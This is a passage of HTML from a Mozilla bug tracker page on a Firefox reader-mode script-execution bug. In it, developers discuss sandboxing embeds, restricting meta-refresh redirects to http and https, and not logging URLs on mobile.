      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-16 01:45 PDT" data-time="1437036327">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-22" data-comment-id="10501994">If we allow arbitrary embeds, objects (especialls flash content), we basically re-allow scripts. Even if we disallow scripts in svg.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(fbraun)</span></div></div></div><div class="change-set" id="c23"><div class="comment" data-id="10503479" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_346894" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/9878b2a2629e131ec58a9760e2733b2f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_346894" id="a335599_428608"><a class="email " href="/user_profile?user_id=346894" > <span class="fna">:Margaret Leibovic</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-16 08:50 PDT" data-time="1437061847">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-23" data-comment-id="10503479">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c22">comment #22</a>)
<span class="quote">&gt; If we allow arbitrary embeds, objects (especialls flash content), we
&gt; basically re-allow scripts. Even if we disallow scripts in svg.</span >

What about sandboxing these embeds in iframes? Looking at the PR for adding support for embedded videos, I see that we added support for detecting an iframe:
<a rel="nofollow" href="https://github.com/mozilla/readability/pull/207">https://github.com/mozilla/readability/pull/207</a>

Or maybe we should just deprecate flash in reader view. As much as it's nice to see embedded media content, I think we've been marketing reader view as more of a &quot;reading&quot; feature than a &quot;watching&quot; feature, so maybe users wouldn't be upset for videos to go missing.

I should note, however, that vimeo has a nice HTML5 player, so maybe not all embedded videos would break if we disallowed arbitrary embeds.</pre></div><div class="change-set" id="c24"><div class="comment" data-id="10506800" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 00:49 PDT" data-time="1437119359">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-24" data-comment-id="10506800">Deprecating flash is your call, but I'm all for it ;)
We could still allow iframes with iframe sandbox - that ensures a separate origin, but we may still allow scripts (which a video player is likely to require).
I will look into this.

Margaret, can you take the part that involves changing the URL bar when we follow meta-redirects?</pre></div><div class="change-set" id="c25"><div class="comment" data-id="10507539" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a335599_428608"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 05:33 PDT" data-time="1437136393">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8635260"
         class="attachment patch obsolete"
         data-id="8635260" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1182778.txt">
      <meta itemprop="contentSize" content="4802">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8635260">
          <a class="link" href="attachment.cgi?id=8635260&amp;action=diff">
        <span id="att-8635260-description" itemprop="description">Patch for redirect issue</span></a> (obsolete)
        — <a href="attachment.cgi?id=8635260&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8635260">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-25" data-comment-id="10507539">Not taking because I'm about to go on PTO (so if this gets r+'d and so on, please land this for me!), but I believe this should do? Freddy, can you please check my scriptsecuritymanager usage? Tested with a chrome URI that this correctly yells and fails to do anything (which actually kicks people back out of reader mode, which I think is OK considering what the page is trying to do). Tested with the attached testcase and:

&lt;meta http-equiv=&quot;refresh&quot; content=&quot;URL=<a rel="nofollow" href="http://www.bbc.co.uk/news/uk-33562420">http://www.bbc.co.uk/news/uk-33562420</a>&quot;&gt;

which correctly shows the BBC URI in the location bar with this patch when showing its reader mode view.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: review?(margaret.leibovic)</div><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: review?(fbraun)</div></div></div><div class="change-set" id="c26"><div class="comment" data-id="10507609" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 05:44 PDT" data-time="1437137083">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-26" data-comment-id="10507609">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>
Patch for redirect issue

Sorry I am not familiar with the scriptSecurityManager. Can you pass it on to someone else?</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: <span class="activity-deleted">review?(margaret.leibovic)</span></div></div></div><div class="change-set" id="c27"><div class="comment" data-id="10507658" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 05:57 PDT" data-time="1437137853">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-27" data-comment-id="10507658">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>
Patch for redirect issue

*facepalms loudly, while re-adding margaret for review*</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: review?(fbraun) &rarr; review?(margaret.leibovic)</div></div></div><div class="change-set" id="c28"><div class="comment" data-id="10507662" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 05:58 PDT" data-time="1437137894">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-28" data-comment-id="10507662">Bobby, is this something you are familiar with? We want to prevent redirects without changes of the URL bar from within reader mode. See comments above for more context. Gijs suggested you might be able to review this patch attempt.</pre><div class="activity"><div class="change">Flags: needinfo?(bobbyholley)</div></div></div><div class="change-set" id="a516050_159069"><div class="change" id="aa516050_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a516050_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a516050_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a516050_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a516050_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a516050_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 06:08 PDT" data-time="1437138524">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Component: Untriaged &rarr; Reader Mode</div><div class="change">Product: Firefox &rarr; Toolkit</div></div></div><div class="change-set" id="c29"><div class="comment" data-id="10509526" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_346894" id="a516050_159069"><img src="https://secure.gravatar.com/avatar/9878b2a2629e131ec58a9760e2733b2f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_346894" id="a516050_159069"><a class="email " href="/user_profile?user_id=346894" > <span class="fna">:Margaret Leibovic</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-17 12:29 PDT" data-time="1437161374">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-29" data-comment-id="10509526">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>
Patch for redirect issue

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>:
-----------------------------------------------------------------

This looks fine to me from a reader view logic point of view, but I'm also not familiar with scriptSecurityManager, and I'd like us to avoid logging the URLs for where this is used on mobile.

::: toolkit/components/reader/AboutReader.jsm
&#64;&#64; +22,5 &#64;&#64;
<span class="quote">&gt;  
&gt;  let AboutReader = function(mm, win, articlePromise) {
&gt;    let url = this._getOriginalUrl(win);
&gt;    if (!(url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;))) {
&gt; +    Cu.reportError(&quot;Only http:// and https:// URLs can be loaded in about:reader (tried to load: &quot; + url + &quot;)&quot;);</span >

On mobile, Cu.reportError goes to logcat, and we have a policy of avoiding logging sensitive data like URLs. Can we avoid logging the URL here, perhaps by putting it behind some sort of debug pref?</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: review?(margaret.leibovic) &rarr; feedback+</div></div></div><div class="change-set" id="c30"><div class="comment" data-id="10521853" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_313730" id="a516050_159069"><img src="https://secure.gravatar.com/avatar/ac57223c49d41049a4917e187b854377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_313730" id="a516050_159069"><a class="email " href="/user_profile?user_id=313730" > <span class="fna">Bobby Holley (:bholley)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-21 16:20 PDT" data-time="1437520850">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-30" data-comment-id="10521853">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>
Patch for redirect issue

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>:
-----------------------------------------------------------------

Sorry I didn't get to this before heading out on PTO - bouncing to bz.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: feedback?(bzbarsky)</div></div></div><div class="change-set" id="a898404_313730"><div class="change" id="aa898404_313730">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_313730" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/ac57223c49d41049a4917e187b854377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_313730" id="a898404_313730"><a class="email " href="/user_profile?user_id=313730" > <span class="fna">Bobby Holley (:bholley)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a898404_313730"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a898404_313730">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a898404_313730">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-21 16:21 PDT" data-time="1437520878">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bobbyholley)</span></div></div></div><div class="change-set" id="c31"><div class="comment" data-id="10530870" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_20209" id="a898404_313730"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_20209" id="a898404_313730"><a class="email " href="/user_profile?user_id=20209" > <span class="fna">Boris Zbarsky [:bzbarsky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-23 11:53 PDT" data-time="1437677582">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-31" data-comment-id="10530870">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8635260" name="attach_8635260" title="Patch for redirect issue">attachment 8635260</a> <a href="/attachment.cgi?id=8635260&amp;action=edit" title="Patch for redirect issue">[details]</a> <a href="/attachment.cgi?id=8635260&amp;action=diff" title="Patch for redirect issue">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8635260'>[review]</a>
Patch for redirect issue

This seems like the right check to do if you want to follow the meta redirect but want to avoid things like data: and javascript:, yes...</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Flags: feedback?(bzbarsky) &rarr; feedback+</div></div></div><div class="change-set" id="c32"><div class="comment" data-id="10566650" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-03 02:00 PDT" data-time="1438592436">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-32" data-comment-id="10566650">(In reply to :Margaret Leibovic from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c29">comment #29</a>)
<span class="quote">&gt; On mobile, Cu.reportError goes to logcat, and we have a policy of avoiding
&gt; logging sensitive data like URLs. Can we avoid logging the URL here, perhaps
&gt; by putting it behind some sort of debug pref?</span >

Is there an existing pref we can use for this so we do report the error on desktop?</pre><div class="activity"><div class="change">Flags: needinfo?(margaret.leibovic)</div></div></div><div class="change-set" id="c33"><div class="comment" data-id="10574015" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_346894" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/9878b2a2629e131ec58a9760e2733b2f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_346894" id="a898404_313730"><a class="email " href="/user_profile?user_id=346894" > <span class="fna">:Margaret Leibovic</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-04 06:16 PDT" data-time="1438694171">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-33" data-comment-id="10574015">(In reply to :Gijs Kruitbosch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c32">comment #32</a>)
<span class="quote">&gt; (In reply to :Margaret Leibovic from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c29">comment #29</a>)
&gt; &gt; On mobile, Cu.reportError goes to logcat, and we have a policy of avoiding
&gt; &gt; logging sensitive data like URLs. Can we avoid logging the URL here, perhaps
&gt; &gt; by putting it behind some sort of debug pref?
&gt; 
&gt; Is there an existing pref we can use for this so we do report the error on
&gt; desktop?</span >

Not that I know of, no. Maybe we should create some pref like &quot;reader.logging.urlLoggingEnabled&quot; that we can set to true in firefox.js and false in mobile.js.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(margaret.leibovic)</span></div></div></div><div class="change-set" id="c34"><div class="comment" data-id="10579003" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-05 02:11 PDT" data-time="1438765916">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8643563"
